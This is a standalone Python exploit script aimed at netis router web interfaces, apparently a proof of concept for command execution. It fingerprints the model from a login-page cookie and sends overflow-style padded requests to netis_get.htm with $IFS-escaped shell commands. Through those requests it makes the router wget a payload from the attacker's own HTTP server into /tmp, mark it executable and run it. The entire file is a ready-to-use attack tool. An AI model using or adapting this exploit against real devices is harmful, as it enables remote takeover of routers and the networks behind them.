#!/usr/bin/python3

import time
import argparse
import requests

import os
import socket
import threading

def get(url):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'}
    return requests.get(url, headers=headers)

def bind_http_server(lhost, lport, shfile):

    with open(shfile, 'r') as f:
        sf = f.read()

    packet  = 'HTTP/1.1 200 OK\r\n'
    packet += f'Content-Length: {len(sf)}\r\n'
    packet += '\r\n'
    packet += sf

    s = socket.socket()
    s.bind((lhost, lport))
    s.listen(1)
    conn, addr = s.accept()
    conn.recv(1024)
    conn.send(packet.encode())
    conn.close()

def escape_command(command):
    ret = "$IFS$()".join(command.split(" "))
    return ret

def exec_mex01(url, command):

    url += "?a=1&b=2&"
    url += "A" * 1068 + "\x78\x58\x43"
    url += "="
    url += "B" * 0x1b
    url += "="
    url += escape_command(command)

    try:
        resp = get(url)
    except Exception:
        pass

    time.sleep(5)

def exec_mex602(url, command):

    url += "?"
    url += "A" * 608 + "\x6c\x4f\x44"
    url += "="
    url += "B" * 0x1f
    url += "="
    url += "C" * 0x18
    url += escape_command(command)

    try:
        resp = get(url)
    except Exception as e:
        pass

    time.sleep(5)

def check(host, port):

    url = f'http://{host}:{port}/login.htm'
    resp = get(url)
    if resp.status_code != 200:
        return None

    Cookie = resp.headers['Set-Cookie']
    if Cookie.find("MEX602") != -1:
        return exec_mex602
    elif Cookie.find("MEX01") != -1:
        return exec_mex01
    else:
        return None

def main(args):

    if not os.path.isfile(args.shfile):
        print(f"[-] \"{args.shfile}\" is invalid file path.")
        return

    exec_mex = check(args.host, args.port)
    if exec_mex == None:
        print(f"[-] Invalid target.")
        return

    url = f"http://{args.host}:{args.port}/netis_get.htm"

    t = threading.Thread(target=bind_http_server,
                         args=(args.lhost, args.lport, args.shfile))
    t.start()

    exec_mex(url, f"rm -f /tmp/s")
    exec_mex(url, f"/bin/wget http://{args.lhost}:{args.lport}/ -O /tmp/s")
    exec_mex(url, f"chmod +x /tmp/s")
    exec_mex(url, f"/tmp/s")

    t.join()

    print("Done.")

if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("--host", type=str, default="192.168.1.1")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--lhost", type=str, default="192.168.1.2")
    parser.add_argument("--lport", type=int, default=8080)
    parser.add_argument("shfile")
    args = parser.parse_args()
    main(args)